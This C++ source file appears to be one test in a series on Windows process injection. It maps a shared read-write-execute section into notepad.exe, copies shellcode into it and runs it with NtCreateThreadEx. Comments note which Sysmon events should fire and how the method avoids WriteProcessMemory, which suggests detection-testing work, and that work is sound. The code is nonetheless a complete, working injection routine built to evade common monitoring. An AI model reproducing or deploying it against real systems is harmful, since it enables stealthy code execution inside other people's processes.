// Uses PROCESS_CREATE_THREA but can be done as combination with T8 Thread hijacking, see t9_ntcreatesection_hijack.cpp.

#include "common.h"

typedef NTSTATUS(NTAPI* pNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
);

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

// Section inherit disposition
#define ViewShare 1

int main() {
    DWORD pid = GetPID(L"notepad.exe");
    if (!pid) {
        wprintf(L"[-] notepad.exe not found\n");
        return 1;
    }
    wprintf(L"[*] Target PID: %lu\n", pid);

    // Resolve native functions from ntdll
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    auto NtCreateSection    = (pNtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
    auto NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
    auto NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
    auto NtCreateThreadEx   = (pNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");

    if (!NtCreateSection || !NtMapViewOfSection || !NtCreateThreadEx) {
        wprintf(L"[-] Failed to resolve ntdll functions\n");
        return 1;
    }
    wprintf(L"[+] NT functions resolved\n");

    // Open target process — note no VM_WRITE needed
    // WriteProcessMemory never called — memory shared via section
    DWORD accessMask = PROCESS_VM_OPERATION      |
                   PROCESS_CREATE_THREAD     |
                   PROCESS_QUERY_INFORMATION;
wprintf(L"[+] Requested access mask: 0x%08X\n", accessMask);

    // EID 10 fires here
    HANDLE hProc = OpenProcess(accessMask, FALSE, pid);
    if (!hProc) {
        wprintf(L"[-] OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] Process handle acquired\n");

    // Create a shared section object — RWX
    HANDLE hSection = NULL;
    LARGE_INTEGER sectionSize = {};
    sectionSize.QuadPart = shellcode_size;

    NTSTATUS st = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &sectionSize,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL
    );
    wprintf(L"[+] NtCreateSection: 0x%08X handle: 0x%p\n", st, hSection);
    if (st != 0) { wprintf(L"[-] Failed\n"); return 1; }

    // Map section into LOCAL process first — to write shellcode
    PVOID localBase = NULL;
    SIZE_T viewSize = 0;
    st = NtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &localBase,
        0, 0, NULL,
        &viewSize,
        ViewShare,
        0,
        PAGE_READWRITE
    );
    wprintf(L"[+] NtMapViewOfSection local: 0x%08X at 0x%p\n", st, localBase);
    if (st != 0) { wprintf(L"[-] Failed\n"); return 1; }

    // Write shellcode into local mapping
    // No WriteProcessMemory needed — shared memory
    memcpy(localBase, shellcode, shellcode_size);
    wprintf(L"[+] Shellcode copied to shared section\n");

    // Map same section into REMOTE process
    // Shellcode is now visible in target without WriteProcessMemory
    PVOID remoteBase = NULL;
    viewSize = 0;
    st = NtMapViewOfSection(
        hSection,
        hProc,
        &remoteBase,
        0, 0, NULL,
        &viewSize,
        ViewShare,
        0,
        PAGE_EXECUTE_READWRITE  // changed from PAGE_EXECUTE_READ
    );
    wprintf(L"[+] NtMapViewOfSection remote: 0x%08X at 0x%p\n", st, remoteBase);
    if (st != 0) { wprintf(L"[-] Failed\n"); return 1; }

    wprintf(L"[+] Section mapped — no VirtualAllocEx, no WriteProcessMemory\n");

    // Create thread in remote process pointing to shellcode
    // EID 8 fires here
    HANDLE hThread = NULL;
    st = NtCreateThreadEx(
        &hThread,
        GENERIC_EXECUTE,
        NULL,
        hProc,
        remoteBase,
        NULL,
        0, 0, 0, 0,
        NULL
    );
    wprintf(L"[+] NtCreateThreadEx: 0x%08X\n", st);
    if (!hThread) { wprintf(L"[-] Thread creation failed\n"); return 1; }

    wprintf(L"[+] Remote thread created\n");
    wprintf(L"[*] EID 8 should fire — StartModule: - (mapped section)\n");
    wprintf(L"[*] EID 10 GrantedAccess lower — no VM_WRITE in mask\n");
    wprintf(L"[*] No VirtualAllocEx or WriteProcessMemory used\n");

    // Unmap local view — no longer needed
    NtUnmapViewOfSection(GetCurrentProcess(), localBase);

    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);
    CloseHandle(hSection);
    CloseHandle(hProc);
    return 0;
}
